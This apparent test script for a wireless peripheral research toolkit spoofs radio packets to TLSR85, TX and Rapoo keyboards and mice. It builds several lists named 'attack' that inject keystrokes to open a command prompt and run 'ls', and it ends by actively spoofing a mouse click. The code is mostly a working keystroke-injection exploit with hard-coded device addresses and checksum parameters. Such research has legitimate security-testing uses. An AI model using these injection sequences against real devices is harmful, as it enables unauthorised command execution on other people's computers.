#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Testing file for sniffing and spoofing wireless devices

import time

from lib import common
from devices.TLSR85.tlsr85_keyboard import Tlsr85Keyboard
from devices.TLSR85.tlsr85_mouse import Tlsr85Mouse
from devices.TX.tx_mouse import Tx_mouse
from devices.TX.tx_keyboard import Tx_Keyboard
from devices.keyboard import * 
from devices.mouse import * 
from devices.Rapoo.rapoo_mouse import *
from devices.Rapoo.rapoo_keyboard import *


common.init_args('./main.py')
common.parse_and_init()


trust_keyboard = Tlsr85Keyboard("4a:b4:cb", "80", "aa:aa:b5", 22, 0x11021, 0x24bf, 2)
# poss_keyboard = Tlsr85Keyboard("d5:54:cb", "80", "aa:aa:cc", 22, 0x11021, 0xcb01, 2)


attack = [
    trust_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(0.5),
    trust_keyboard.build_packet([KeyboardScancode.KEY_C]),
    trust_keyboard.build_packet([KeyboardScancode.KEY_M]),
    trust_keyboard.build_packet([KeyboardScancode.KEY_D]),
    lambda: time.sleep(0.5),
    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1),
    trust_keyboard.build_packet([KeyboardScancode.KEY_L]),
    trust_keyboard.build_packet([KeyboardScancode.KEY_S]),
    trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]


#trust_keyboard.spoof(attack)

trust_mouse = Tlsr85Mouse("4a:b4:cb", "dc", "aa:aa:aa:b5", 30, 0x11021, 0x24bf, 2)
#trust_mouse.sniff()

tx_mouse = Tx_mouse("55:79:90:16", 0x11021, 0x6818)
tx_keyboard = Tx_Keyboard("55:79:90:16", 0x11021, 0x6818)

attack = [
    *tx_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(0.5),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_C]),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_M]),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_D]),
    lambda: time.sleep(0.5),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_L]),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_S]),
    *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]

# tx_keyboard.spoof(attack)

#m = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="8888")
#tx_mouse.spoof(m)

rapoo_Keyboard = Rapoo_Keyboard("c7:92:78:79", 0x11021, 0xefdf)

attack = [
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
    lambda: time.sleep(1),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_C]),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_M]),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_D]),
    lambda: time.sleep(1),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1.5),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_L]),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_S]),
    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
    ]

#rapoo_Keyboard.spoof(attack)

rapoo_Mouse = Rapoo_Mouse("c7:92:78:79", 0x11021, 0xefdf)
attack = [
    rapoo_Mouse.build_packet([MouseClickType.LEFT_CLICK])
]
rapoo_Mouse.spoof(attack)